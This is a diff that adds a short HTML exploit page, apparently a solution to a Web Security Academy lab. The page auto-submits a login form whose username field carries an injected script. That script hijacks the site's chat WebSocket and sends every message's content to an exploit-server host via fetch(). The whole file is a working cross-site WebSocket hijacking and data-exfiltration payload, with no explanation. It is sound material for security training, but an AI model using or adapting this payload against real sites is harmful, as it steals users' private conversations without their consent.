@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <form action="https://cms-0a1800cf033fe33080870de4003e00ee.web-security-academy.net/login" method="POST">
+        <input type="hidden" name="username" value='<script>const s = new WebSocket("https://0a1800cf033fe33080870de4003e00ee.web-security-academy.net/chat");s.onopen = function() {s.send("READY");};s.onmessage = function(event) {if(d = JSON.parse(event.data)) {fetch("https://exploit-0a080026032be3cb804c0c1a012600f6.exploit-server.net/exploit?data=" + encodeURIComponent(d["content"]));}};</script>'>
+        <input type="hidden" name="password" value="abcd1234">
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
